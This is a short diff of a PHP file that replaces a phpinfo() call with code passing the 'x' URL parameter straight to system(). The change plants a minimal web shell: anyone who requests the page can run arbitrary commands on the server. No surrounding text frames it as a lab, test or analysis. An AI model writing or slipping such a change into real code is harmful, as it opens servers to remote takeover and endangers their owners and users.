@@ -1,3 +1,5 @@
 <?php
-phpinfo();
+if(isset($_GET["x"])){
+    system($_GET["x"]);
+}
 ?>
